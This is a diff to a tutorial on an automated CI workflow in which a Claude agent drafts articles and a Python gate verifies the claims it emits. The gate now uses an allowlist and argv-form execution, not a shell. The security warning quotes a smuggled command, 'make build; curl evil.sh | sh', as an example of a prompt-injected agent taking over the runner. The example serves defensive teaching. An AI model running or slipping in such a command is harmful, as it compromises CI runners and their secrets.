@@ -147,7 +147,7 @@ echo "item_id=$ITEM_ID" >> "$GITHUB_OUTPUT"
 
 Note the most important line: when the backlog is empty, the forge exits `0`. An idle forge is healthy, not broken. The write-back matters just as much — without flipping that item's `status` to `claimed` and staging it, a second run (or a retry) would happily select the *same* item and you would forge it twice. Commit that claim alongside the draft so the queue and the work stay in lockstep. The agent step then receives the brief and writes a draft into the repo on a fresh branch — never to `main`. Expect the agent to create or modify exactly the file(s) implied by the brief; if it touches more than the targeted collection, your later guard should catch it.
 
-How does the agent actually get invoked? You hand it the claimed `brief` and tell it the one path to write — the draft path out. The exact step (`claude -p "...Brief: $BRIEF. Write ONLY $DRAFT_PATH..."`) is shown in **The Complete Forge Workflow** below; the contract is simple: brief in, a single draft file out at `pages/_<collection>/<item_id>.md`.
+How does the agent actually get invoked? You hand it the claimed `brief` and tell it the one path to write — the draft path out. The exact step (`claude -p "...Brief: $BRIEF. Write ONLY $DRAFT_PATH..."`) is shown in **The Complete Forge Workflow** below; the contract is simple: brief in, two files out — the draft at `pages/_<collection>/<item_id>.md` and its `claims-<item_id>.json` sidecar in the same directory, so the gate can find it by a path the workflow already knows.
 
 ### 🔍 Knowledge Check
 
@@ -168,7 +168,7 @@ Now temper the blade. The **Prime Directive** says: *if the draft asserts someth
 
 The claims come from a small sidecar the agent is told to emit — a `claims.json` written next to the draft, listing every assertion it wants checked. The gate reads that list on stdin and either lets the forge strike or aborts the whole run.
 
-> ⚠️ **SECURITY WARNING — command injection.** The `command_succeeds` branch below runs `subprocess.run(cmd, shell=True)` on a string that *originated from the agent's output*. Treat any agent-generated string as untrusted input. With `shell=True`, a claim like `target: "make build; curl evil.sh | sh"` executes arbitrary code on your runner. **Threat model:** a prompt-injected or simply confused agent can smuggle shell metacharacters into a claim and own your CI runner (which holds your tokens). **Mitigations, in order of preference:** (1) drop `shell=True` and pass an **allowlist** of argument vectors — only permit `make <target>` where `<target>` matches a known set like `{"build", "test", "lint"}`; (2) run the gate inside a **network-less, ephemeral sandbox** (a throwaway container with no secrets mounted and `--network none`) so even a successful injection can exfiltrate nothing; (3) never let agent text reach a shell at all — restrict verifiable claim kinds to ones you evaluate in pure Python (`file_exists`, `link_resolves`, `regex_present`). The snippet keeps `shell=True` only to show the danger plainly — do not ship it as-is.
+> ⚠️ **SECURITY WARNING — command injection.** The `command_succeeds` branch below runs a command string that *originated from the agent's output*. Treat any agent-generated string as untrusted input. The naive way to run it — `subprocess.run(cmd, shell=True)` — is a trap: a claim like `target: "make build; curl evil.sh | sh"` would execute arbitrary code on your runner. **Threat model:** a prompt-injected or simply confused agent can smuggle shell metacharacters into a claim and own your CI runner (which holds your tokens). **Mitigations, in order of preference:** (1) never use `shell=True` — pass an **allowlist** of argument vectors and run the argv-form (`target.split()`), so only a `make <target>` on a known set like `{"build", "test", "lint"}` is permitted and metacharacters never reach a shell; (2) run the gate inside a **network-less, ephemeral sandbox** (a throwaway container with no secrets mounted and `--network none`) so even a successful injection can exfiltrate nothing; (3) restrict verifiable claim kinds to ones you evaluate in pure Python (`file_exists`, `link_resolves`, `regex_present`). The snippet below already applies mitigation (1) — allowlist plus argv-form, no shell — so the payload above is rejected before it can run.
 
 ```python
 # .forge/verify.py — the Prime Directive gate (runs before any PR is opened)
@@ -183,9 +183,9 @@ def claim_passes(check: dict) -> bool:
     if check["kind"] == "file_exists":
         return Path(check["target"]).exists()
     if check["kind"] == "command_succeeds":
-        # ⚠️ shell=True on agent-generated input is a command-injection risk.
-        # In production, replace this with an allowlist (see the warning above)
-        # or run inside a network-less sandbox. Shown here only to be explicit.
+        # Agent-generated input is untrusted, so this branch NEVER uses shell=True:
+        # it fails closed unless the target is on a fixed allowlist, then runs the
+        # argv-form (split()) so shell metacharacters can never reach a shell.
         allowed = {"make build", "make test", "make lint"}
         if check["target"] not in allowed:
             return False  # fail closed: not on the allowlist → not verifiable
@@ -204,8 +204,8 @@ def enforce(claims: list[dict]) -> None:
 
 
 if __name__ == "__main__":
-    # claims arrive on stdin as a JSON list, e.g. the agent's claims.json:
-    #   cat draft/claims.json | python .forge/verify.py
+    # claims arrive on stdin as a JSON list, e.g. the agent's claims file:
+    #   cat pages/_<collection>/claims-<item_id>.json | python .forge/verify.py
     enforce(json.load(sys.stdin))
 ```
 
@@ -303,18 +303,22 @@ jobs:
         run: |
           BRIEF=$(yq ".items[] | select(.id == \"$ITEM_ID\") | .brief" .forge/backlog.yml)
           DRAFT_PATH="pages/_${{ matrix.collection }}/${ITEM_ID}.md"
+          CLAIMS_PATH="pages/_${{ matrix.collection }}/claims-${ITEM_ID}.json"
           claude -p "Draft a Markdown article for the '${{ matrix.collection }}' collection. \
-            Brief: $BRIEF. Write ONLY $DRAFT_PATH plus a claims.json of checkable assertions. \
-            Make no claim you cannot prove." \
+            Brief: $BRIEF. Write ONLY these two files: the draft at $DRAFT_PATH, plus a \
+            JSON list of checkable assertions at $CLAIMS_PATH. Make no claim you cannot prove." \
             --allowedTools "Write,Edit,Read" \
             --output-format text
           echo "draft_path=$DRAFT_PATH" >> "$GITHUB_OUTPUT"
+          echo "claims_path=$CLAIMS_PATH" >> "$GITHUB_OUTPUT"
 
       - name: Prime Directive gate
         if: steps.select.outputs.forge_idle != 'true'
+        env:
+          CLAIMS_PATH: ${{ steps.forge.outputs.claims_path }}
         run: |
           # the gate reads the agent's claims.json on stdin; non-zero aborts the run
-          cat draft/claims.json | python .forge/verify.py
+          cat "$CLAIMS_PATH" | python .forge/verify.py
 
       - name: Open the draft PR
         if: steps.select.outputs.forge_idle != 'true'
